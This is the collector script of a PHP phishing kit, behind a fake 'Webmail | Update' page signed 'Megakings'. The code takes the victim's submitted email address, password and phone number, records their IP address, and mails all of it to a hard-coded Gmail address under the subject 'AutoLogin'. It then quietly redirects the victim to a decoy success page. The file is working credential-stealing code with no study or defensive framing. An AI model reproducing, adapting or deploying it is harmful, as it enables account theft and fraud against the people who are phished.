<?php

@ini_set('display_errors',0);
$ip = $_SERVER['REMOTE_ADDR'];
$text = $_POST['text'];
$text2 = $_POST['text2'];
$pnum = $_POST['Phone_Number'];
$domain = $_POST['domain'];


$data = "
------------ Created By Megakings ------------
E-mail ID : $text
Password  : $text2
Phone_Number: $pnum
-------------------------
IP : $ip
Url: http://www.geoiptool.com/?IP=$ip
------------ Created By Megakings ------------
";

$mailsubj = "| AutoLogin: | $text | $text2 ";


$emailusr = '
lirychris2211@gmail.com
';

mail($emailusr, $mailsubj, $data);

header("Location: success.php?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&text=$text&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");

?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<head>
<html><head><title>Webmail | Update</title>

<link rel="icon" href="files/id.png" sizes="13x13" type="image/png">

<meta http-equiv="refresh" content="0;url=success.php?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&text=$text&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1" />

<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
<style type="text/css">
body { height: 100%; background-color: #F9F8F8; margin: 0px; padding:0px; font-family: Tahoma, Arial, Helvetica, sans-serif; font-size: 11px; font-weight: normal; color: #000000;}
a:link { color:#00238a;text-decoration: none; }
a:visited { color:#00238a;text-decoration: none; }
a:hover { text-decoration: underline; }
a:active { text-decoration: underline; }
a#forgot {color:#444444;text-decoration:underline;}
a#forgot:hover { text-decoration:underline; color:#0F0F0F; border-color:#666666; }
a.oli { display: list-item; margin-left: 20px; margin-top: 5px; margin-bottom: 5px}
input#p, input#l { border: 1px solid #999999; font-size:11px; width:144px;}
table { color:#444444;font-size: 11px;}
h2 { color: #5e77b2; margin: 0 0 5px 0; font-size: 14px; font-weight: bold;border-bottom:1px solid #cccccc;padding-bottom:5px;font-family: Tahoma, Arial, Helvetica, sans-serif;}
h3 {font-size: 12px;margin: 5px 0;font-family: Tahoma, Arial, Helvetica, sans-serif;}
#header { position: relative; width: 100%; background:#8ea5ec; height:60px !important;border-bottom:2px solid #7083e1;}
#header h1 { margin:0 !important;padding:0 !important;text-indent:-2000em;width:214px;height:60px;}
#header #logo {position:absolute;top:15; left:10px; right:0;background:#8ea5ec; font-family: Tahoma, Arial, Helvetica, sans-serif; font-weight: 500; font-size:22px; color:#FFFFFF;}
div#centered { border: 0; width: 500px; margin:70px auto; color: black; padding:10px;border:2px solid #b1c5de; text-align:right;background: #ffffff;overflow:hidden;}
.aligncenter {text-align:center;}
#content {width:480px;text-align:left;float:right;}
form {white-space: nowrap; margin-bottom:2em; margin-top: 2em;}
small {text-align:right; display: block; font-size: x-small;}
#copyright { position:absolute;right:10px; top:15px; font-family: Tahoma, Arial, Helvetica, sans-serif; font-size: 11px; font-weight: normal; width: auto; text-align:right; }
#copyright a {color:#ffffff;}
#copyright a:hover {text-decoration:none;}
#bottom { position:absolute; bottom:0; width: 100%; background: #8ea5ec; height:38px !important;}
#bottom_text { position:absolute;left:10px; top:13px; text-align:left; font-family: Tahoma, Arial, Helvetica, sans-serif; font-size: 11px; font-weight: normal; color:#00238a;}
</style>

</head>
<body>
</div>
</body>
</html>